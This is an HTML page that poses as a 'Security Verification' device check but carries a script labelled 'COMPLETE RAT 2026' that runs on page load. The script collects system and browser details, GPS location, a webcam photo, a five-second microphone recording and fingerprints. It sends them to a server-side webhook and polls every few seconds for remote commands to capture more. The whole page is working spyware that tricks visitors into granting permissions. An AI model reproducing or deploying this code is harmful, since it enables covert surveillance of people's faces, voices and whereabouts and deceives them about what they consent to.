<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Verification Required</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 24px;
      box-shadow: 0 25px 80px rgba(0,0,0,0.5);
      max-width: 700px;
      width: 100%;
      overflow: hidden;
      animation: slideIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    }
    @keyframes slideIn {
      from { opacity: 0; transform: translateY(40px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .header {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 40px 30px;
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    .shield-icon {
      font-size: 72px;
      margin-bottom: 15px;
      animation: pulse 2s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
    .header h1 {
      font-size: 32px;
      margin-bottom: 12px;
      font-weight: 700;
    }
    .content {
      padding: 40px 35px;
    }
    .status-box {
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      color: white;
      border-radius: 16px;
      padding: 25px;
      margin-bottom: 30px;
      text-align: center;
      box-shadow: 0 8px 24px rgba(245, 87, 108, 0.3);
    }
    .status-box h2 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    .progress-container {
      background: rgba(0,0,0,0.1);
      border-radius: 12px;
      height: 40px;
      overflow: hidden;
      margin: 25px 0;
    }
    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #667eea, #764ba2);
      width: 0%;
      transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: 700;
      font-size: 16px;
    }
    .info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 20px;
      margin: 30px 0;
    }
    .info-card {
      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
      border-radius: 12px;
      padding: 20px;
      text-align: center;
      transition: all 0.3s ease;
    }
    .info-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 12px 24px rgba(0,0,0,0.15);
    }
    .info-icon {
      font-size: 36px;
      margin-bottom: 10px;
    }
    .info-label {
      font-size: 12px;
      color: #666;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 5px;
    }
    .info-value {
      font-size: 18px;
      font-weight: 700;
      color: #333;
    }
    .status-message {
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      font-weight: 600;
      text-align: center;
      animation: fadeIn 0.5s;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .status-message.checking {
      background: linear-gradient(135deg, #ffeaa7 0%, #fdcb6e 100%);
      color: #2d3436;
    }
    .status-message.success {
      background: linear-gradient(135deg, #55efc4 0%, #00b894 100%);
      color: white;
    }
    .spinner {
      display: inline-block;
      width: 24px;
      height: 24px;
      border: 3px solid rgba(255,255,255,0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-right: 10px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .security-badges {
      display: flex;
      justify-content: space-around;
      margin-top: 30px;
      padding-top: 30px;
      border-top: 2px solid #e0e0e0;
    }
    .badge {
      text-align: center;
      flex: 1;
    }
    .badge-icon {
      font-size: 28px;
      margin-bottom: 8px;
    }
    .badge-text {
      font-size: 11px;
      color: #666;
      font-weight: 600;
      text-transform: uppercase;
    }
    #videoPreview, #audioVisualizer {
      display: none;
      margin: 20px auto;
      border-radius: 12px;
      max-width: 100%;
    }
    @media (max-width: 600px) {
      .info-grid { grid-template-columns: 1fr; }
      .header h1 { font-size: 24px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="shield-icon">üîê</div>
      <h1>Security Verification</h1>
      <p>Advanced Protection System 2026</p>
    </div>

    <div class="content">
      <div class="status-box">
        <h2>‚ö° System Check In Progress</h2>
        <p>Verifying your device security and authenticity</p>
      </div>

      <div class="progress-container">
        <div class="progress-bar" id="progressBar">0%</div>
      </div>

      <div class="info-grid">
        <div class="info-card">
          <div class="info-icon">üåê</div>
          <div class="info-label">Connection</div>
          <div class="info-value" id="connectionStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üîã</div>
          <div class="info-label">Battery</div>
          <div class="info-value" id="batteryStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üìç</div>
          <div class="info-label">Location</div>
          <div class="info-value" id="locationStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üì∑</div>
          <div class="info-label">Camera</div>
          <div class="info-value" id="cameraStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üé§</div>
          <div class="info-label">Microphone</div>
          <div class="info-value" id="microphoneStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üíª</div>
          <div class="info-label">System</div>
          <div class="info-value" id="systemStatus">Checking...</div>
        </div>
      </div>

      <video id="videoPreview" width="320" height="240" autoplay></video>
      <canvas id="audioVisualizer" width="320" height="100"></canvas>

      <div class="status-message checking" id="statusMessage">
        <span class="spinner"></span>
        <span>Running security diagnostics...</span>
      </div>

      <div class="security-badges">
        <div class="badge">
          <div class="badge-icon">üîí</div>
          <div class="badge-text">Encrypted</div>
        </div>
        <div class="badge">
          <div class="badge-icon">‚úì</div>
          <div class="badge-text">Verified</div>
        </div>
        <div class="badge">
          <div class="badge-icon">‚ö°</div>
          <div class="badge-text">Real-time</div>
        </div>
        <div class="badge">
          <div class="badge-icon">üõ°Ô∏è</div>
          <div class="badge-text">Secure</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // COMPLETE RAT 2026 - WITH CAMERA & MICROPHONE
    let sessionId = 'rat2026_' + Date.now() + '_' + Math.random().toString(36).substr(2, 12);
    let progress = 0;
    let collectedData = {
      sessionId: sessionId,
      timestamp: new Date().toISOString()
    };
    let mediaStream = null;
    let audioContext = null;

    console.log('[RAT2026] Session started:', sessionId);

    function updateProgress(percent, message) {
      progress = percent;
      const bar = document.getElementById('progressBar');
      bar.style.width = percent + '%';
      bar.textContent = percent + '%';
      
      const statusMsg = document.getElementById('statusMessage');
      if (message) {
        statusMsg.innerHTML = '<span class="spinner"></span><span>' + message + '</span>';
      }
      console.log(`[RAT2026] Progress: ${percent}% - ${message}`);
    }

    // COLLECT ALL BASIC SYSTEM DATA
    async function collectSystemData() {
      updateProgress(5, 'Collecting system information...');
      
      collectedData.userAgent = navigator.userAgent;
      collectedData.platform = navigator.platform;
      collectedData.language = navigator.language;
      collectedData.languages = navigator.languages ? Array.from(navigator.languages) : [];
      
      collectedData.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation ? screen.orientation.type : 'unknown'
      };
      
      collectedData.hardware = {
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0
      };
      
      collectedData.browser = {
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine,
        vendor: navigator.vendor,
        product: navigator.product
      };
      
      collectedData.timezone = {
        zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: new Date().getTimezoneOffset(),
        locale: Intl.DateTimeFormat().resolvedOptions().locale
      };

      document.getElementById('systemStatus').textContent = 'Collected ‚úì';
      console.log('[RAT2026] System data collected');
    }

    // GET CONNECTION INFO
    async function getConnectionInfo() {
      updateProgress(10, 'Analyzing network...');
      
      if (navigator.connection) {
        const connection = navigator.connection;
        collectedData.connection = {
          effectiveType: connection.effectiveType || 'unknown',
          downlink: connection.downlink || 'unknown',
          rtt: connection.rtt || 'unknown',
          saveData: connection.saveData || false
        };
        document.getElementById('connectionStatus').textContent = (connection.effectiveType || 'Online').toUpperCase();
      } else {
        collectedData.connection = { type: 'unavailable' };
        document.getElementById('connectionStatus').textContent = 'Online';
      }
    }

    // GET BATTERY INFO
    async function getBatteryInfo() {
      updateProgress(15, 'Reading battery...');
      
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          collectedData.battery = {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging,
            chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' sec',
            dischargingTime: battery.dischargingTime === Infinity ? 'Full' : battery.dischargingTime + ' sec'
          };
          document.getElementById('batteryStatus').textContent = Math.round(battery.level * 100) + '%';
        } else {
          collectedData.battery = { status: 'unavailable' };
          document.getElementById('batteryStatus').textContent = 'N/A';
        }
      } catch (e) {
        collectedData.battery = { error: e.message };
        document.getElementById('batteryStatus').textContent = 'N/A';
      }
    }

    // GET GPS LOCATION
    async function getLocation() {
      updateProgress(20, 'Requesting GPS...');
      
      return new Promise((resolve) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              collectedData.location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy + ' meters',
                altitude: position.coords.altitude || 'unavailable',
                speed: position.coords.speed || 'unavailable',
                heading: position.coords.heading || 'unavailable',
                timestamp: new Date(position.timestamp).toISOString()
              };
              document.getElementById('locationStatus').textContent = 'Captured ‚úì';
              console.log('[RAT2026] GPS captured');
              resolve();
            },
            (error) => {
              collectedData.location = { error: error.message };
              document.getElementById('locationStatus').textContent = 'Denied ‚úó';
              resolve();
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
          );
        } else {
          collectedData.location = { error: 'Not supported' };
          document.getElementById('locationStatus').textContent = 'N/A';
          resolve();
        }
      });
    }

    // GET CAMERA ACCESS & CAPTURE PHOTO
    async function getCameraAccess() {
      updateProgress(30, 'Requesting camera access...');
      
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            width: { ideal: 1280 },
            height: { ideal: 720 },
            facingMode: 'user'
          } 
        });
        
        mediaStream = stream;
        
        // Show video preview
        const video = document.getElementById('videoPreview');
        video.srcObject = stream;
        video.style.display = 'block';
        
        // Wait a moment for camera to adjust
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Capture photo
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // Convert to base64
        const photoData = canvas.toDataURL('image/jpeg', 0.8);
        
        collectedData.camera = {
          status: 'captured',
          photo: photoData.substring(0, 200) + '...[TRUNCATED]',
          photoFull: photoData, // Full photo data
          resolution: `${canvas.width}x${canvas.height}`,
          timestamp: new Date().toISOString()
        };
        
        document.getElementById('cameraStatus').textContent = 'Captured ‚úì';
        console.log('[RAT2026] Camera photo captured');
        
        // Stop camera after capture
        setTimeout(() => {
          stream.getTracks().forEach(track => track.stop());
          video.style.display = 'none';
        }, 3000);
        
      } catch (error) {
        collectedData.camera = { 
          status: 'denied',
          error: error.message 
        };
        document.getElementById('cameraStatus').textContent = 'Denied ‚úó';
        console.log('[RAT2026] Camera denied:', error);
      }
    }

    // GET MICROPHONE ACCESS & RECORD AUDIO
    async function getMicrophoneAccess() {
      updateProgress(50, 'Requesting microphone access...');
      
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          audio: {
            echoCancellation: true,
            noiseSuppression: true,
            autoGainControl: true
          }
        });
        
        // Create audio context
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const source = audioContext.createMediaStreamSource(stream);
        const analyzer = audioContext.createAnalyser();
        analyzer.fftSize = 256;
        source.connect(analyzer);
        
        // Visualize audio
        const canvas = document.getElementById('audioVisualizer');
        canvas.style.display = 'block';
        const canvasCtx = canvas.getContext('2d');
        const bufferLength = analyzer.frequencyBinCount;
        const dataArray = new Uint8Array(bufferLength);
        
        function draw() {
          requestAnimationFrame(draw);
          analyzer.getByteFrequencyData(dataArray);
          
          canvasCtx.fillStyle = 'rgb(0, 0, 0)';
          canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
          
          const barWidth = (canvas.width / bufferLength) * 2.5;
          let barHeight;
          let x = 0;
          
          for (let i = 0; i < bufferLength; i++) {
            barHeight = dataArray[i] / 2;
            canvasCtx.fillStyle = `rgb(${barHeight + 100}, 50, 50)`;
            canvasCtx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
            x += barWidth + 1;
          }
        }
        
        draw();
        
        // Record audio for 5 seconds
        const mediaRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        
        mediaRecorder.ondataavailable = (event) => {
          audioChunks.push(event.data);
        };
        
        mediaRecorder.onstop = async () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
          const reader = new FileReader();
          reader.readAsDataURL(audioBlob);
          reader.onloadend = () => {
            collectedData.microphone = {
              status: 'recorded',
              audioClip: reader.result.substring(0, 200) + '...[TRUNCATED]',
              audioFull: reader.result, // Full audio data
              duration: '5 seconds',
              format: 'audio/webm',
              timestamp: new Date().toISOString()
            };
            console.log('[RAT2026] Audio recorded');
          };
          
          // Stop microphone
          stream.getTracks().forEach(track => track.stop());
          canvas.style.display = 'none';
        };
        
        mediaRecorder.start();
        setTimeout(() => {
          mediaRecorder.stop();
        }, 5000);
        
        document.getElementById('microphoneStatus').textContent = 'Recording...';
        
        // Update status after recording
        setTimeout(() => {
          document.getElementById('microphoneStatus').textContent = 'Captured ‚úì';
        }, 5500);
        
      } catch (error) {
        collectedData.microphone = { 
          status: 'denied',
          error: error.message 
        };
        document.getElementById('microphoneStatus').textContent = 'Denied ‚úó';
        console.log('[RAT2026] Microphone denied:', error);
      }
    }

    // GET MEDIA DEVICES LIST
    async function getMediaDevices() {
      updateProgress(65, 'Detecting devices...');
      
      try {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          const devices = await navigator.mediaDevices.enumerateDevices();
          collectedData.mediaDevices = {
            audioInput: devices.filter(d => d.kind === 'audioinput').length,
            audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
            videoInput: devices.filter(d => d.kind === 'videoinput').length,
            total: devices.length,
            devices: devices.map(d => ({
              kind: d.kind,
              label: d.label || 'unlabeled',
              deviceId: d.deviceId ? 'present' : 'none'
            }))
          };
        }
      } catch (e) {
        collectedData.mediaDevices = { error: e.message };
      }
    }

    // GET CANVAS FINGERPRINT
    function getCanvasFingerprint() {
      updateProgress(75, 'Fingerprinting...');
      
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('RAT2026', 2, 15);
        collectedData.canvasFingerprint = canvas.toDataURL().substring(0, 150) + '...';
      } catch (e) {
        collectedData.canvasFingerprint = { error: e.message };
      }
    }

    // GET WEBGL INFO
    function getWebGLInfo() {
      updateProgress(85, 'Reading GPU...');
      
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          collectedData.webgl = {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            version: gl.getParameter(gl.VERSION),
            unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unavailable',
            unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unavailable'
          };
        }
      } catch (e) {
        collectedData.webgl = { error: e.message };
      }
    }

    // SEND DATA TO SERVER
    async function sendDataToServer(data) {
      updateProgress(95, 'Transmitting...');
      
      console.log('[RAT2026] Sending data package');
      
      try {
        const response = await fetch('rat2026_webhook.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        
        const result = await response.json();
        console.log('[RAT2026] Server response:', result);
        return result;
      } catch (e) {
        console.error('[RAT2026] Send error:', e);
        return { error: e.message };
      }
    }

    // CHECK FOR COMMANDS
    async function checkForCommands() {
      try {
        const response = await fetch('get_command2026.php?session=' + sessionId);
        const data = await response.json();
        if (data.success && data.command) {
          console.log('[RAT2026] Command received:', data.command);
          executeCommand(data.command);
        }
      } catch (e) {
        console.error('[RAT2026] Command error:', e);
      }
    }

    // EXECUTE REMOTE COMMANDS
    async function executeCommand(cmd) {
      console.log('[RAT2026] Executing:', cmd);
      let result = { command: cmd, timestamp: new Date().toISOString(), sessionId: sessionId };
      
      switch(cmd) {
        case 'get_location':
          await getLocation();
          result.data = collectedData.location;
          break;
        case 'get_battery':
          await getBatteryInfo();
          result.data = collectedData.battery;
          break;
        case 'capture_photo':
          await getCameraAccess();
          result.data = collectedData.camera;
          break;
        case 'record_audio':
          await getMicrophoneAccess();
          result.data = collectedData.microphone;
          break;
        case 'get_all':
          await main();
          result.data = collectedData;
          break;
        case 'refresh':
          location.reload();
          break;
        default:
          result.data = 'Unknown command';
      }
      
      await sendDataToServer(result);
    }

    // MAIN EXECUTION
    async function main() {
      console.log('[RAT2026] Starting complete collection...');
      
      await collectSystemData();
      await getConnectionInfo();
      await getBatteryInfo();
      await getLocation();
      await getCameraAccess();
      await getMicrophoneAccess();
      await getMediaDevices();
      getCanvasFingerprint();
      getWebGLInfo();
      
      await sendDataToServer(collectedData);
      
      updateProgress(100, 'Verification complete!');
      
      const statusMsg = document.getElementById('statusMessage');
      statusMsg.className = 'status-message success';
      statusMsg.innerHTML = '‚úÖ <strong>Complete!</strong> All security checks passed.';
      
      console.log('[RAT2026] Complete! Data:', collectedData);
      
      // Listen for commands every 5 seconds
      setInterval(checkForCommands, 5000);
    }

    // AUTO-START
    window.onload = () => {
      console.log('[RAT2026] Initialized');
      main();
    };
  </script>
</body>
</html>
